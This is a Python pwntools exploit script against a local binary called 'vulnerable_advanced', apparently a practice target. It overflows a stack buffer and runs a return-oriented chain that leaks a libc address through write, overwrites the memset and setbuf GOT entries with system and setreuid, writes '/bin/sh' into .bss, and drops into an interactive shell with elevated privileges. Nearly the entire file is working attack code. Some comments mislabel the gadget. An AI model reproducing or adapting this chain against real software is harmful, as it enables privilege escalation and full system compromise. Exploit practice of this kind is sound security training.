#!/usr/bin/env python3

from pwn import *
from struct import pack, unpack

vuln = ELF('./vulnerable_advanced')
context.binary = './vulnerable_advanced'
r = vuln.process()

write_plt    = 0x401080         # address of write@plt
read_plt     = 0x4010c0         # address of read@plt
memset_plt   = 0x4010b0         # address of memset@plt
memset_got   = 0x404030         # memset()'s GOT entry
setbuf_plt   = 0x401090         # address of setbuf@plt
setbuf_got   = 0x404020         # setbuf()'s GOT entry
pop3ret      = 0x4011be         # gadget to pop rdi; pop rsi; pop rdx; ret (from helper function)
memset_off   = 0x18efc0         # memset()'s offset in libc.so.6 (here: __memset_avx2_unaligned)
system_off   = 0x0554e0         # system()'s offset in libc.so.6
setreuid_off = 0x117c20         # setreuid()'s offset in libc.so.6
binsh_off    = 0x1b6613         # "/bin/sh" offset in libc.so.6 (not used)
writeable    = 0x404058         # location to write "/bin/sh" to (here: location in .bss section)

# Padding
buf = bytearray()
buf += bytes(
    'A'*168,
    encoding='ascii')           # padding to RIP's offset (152 for aligned buffer, 8 for ssize_t b, 8 for saved frame pointer)

# Leak memset()'s libc address using write@plt (memset() is __memset_avx_unaligned() here)
buf += pack('<Q', pop3ret)      # pop args into registers
buf += pack('<Q', 0x1)          # stdout
buf += pack('<Q', memset_got)   # address to read from
buf += pack('<Q', 0x8)          # number of bytes to write to stdout
buf += pack('<Q', write_plt)    # return to write@plt

# Payload for stage 1: overwrite memset()'s GOT entry using read@plt
buf += pack('<Q', pop3ret)      # pop args into registers
buf += pack('<Q', 0x0)          # stdin
buf += pack('<Q', memset_got)   # address to write to
buf += pack('<Q', 0x8)          # number of bytes to read from stdin
buf += pack('<Q', read_plt)     # return to read@plt
# Overwrite setbuf()'s GOT entry using read@plt
buf += pack('<Q', pop3ret)      # pop args into registers
buf += pack('<Q', 0x0)          # stdin
buf += pack('<Q', setbuf_got)   # address to write to
buf += pack('<Q', 0x8)          # number of bytes to read from stdin
buf += pack('<Q', read_plt)     # return to read@plt

# Payload for stage 2: read "/bin/sh" into writeable location using read@plt
buf += pack('<Q', pop3ret)      # pop args into registers
buf += pack('<Q', 0x0)          # junk
buf += pack('<Q', writeable)    # location to write "/bin/sh" to
buf += pack('<Q', 0x8)          # number of bytes to read from stdin
buf += pack('<Q', read_plt)     # return to read@plt

# Payload for stage 3: call setreuid(0, 0)
# buf += pack('<Q', pop3ret)      # pop rdi; pop rsi; ret
# buf += pack('<Q', 0x0)          # UID 0
# buf += pack('<Q', 0x0)          # GID 0
# buf += pack('<Q', 0x1)          # junk
buf += pack('<Q', setbuf_plt)   # return to setbuf@plt which due to setbuf@got.plt pointing to setreuid is actually setreuid() now
# Set RDI to location of "/bin/sh", and call system()
buf += pack('<Q', pop3ret)      # pop rdi; ret
buf += pack('<Q', writeable)    # address of "/bin/sh"
buf += pack('<Q', 0x1)          # junk
buf += pack('<Q', 0x1)          # junk
buf += pack('<Q', memset_plt)   # return to memset@plt which due to memset@got.plt pointing to system is actually system() now

# Stage 1: leak memset address
r.send(buf)                     # send buf to overwrite RIP
reply = r.read()                # receive reply
# print(reply)
d = reply[-8:]                  # we returned to write@plt, so receive the leaked memset() libc address which is the last 8 bytes in the reply

memset_addr = unpack('<Q', d)
log.info(f'memset() is at {hex(memset_addr[0])}')

libc_base = memset_addr[0] - memset_off
log.info(f'libc base address is {hex(libc_base)}')

system_addr = libc_base + system_off
log.info(f'system() is at {hex(system_addr)}')

setreuid_addr = libc_base + setreuid_off
log.info(f'setreuid() is at {hex(setreuid_addr)}')

# Stage 2: send system()'s address to overwrite memset()'s GOT entry
r.send(pack('<Q', system_addr))

# send setreuid()'s address to overwrite setbuf()'s GOT entry
r.send(pack('<Q', setreuid_addr))

# Stage 3: send "/bin/sh" to writable location
r.send('/bin/sh')

r.interactive()
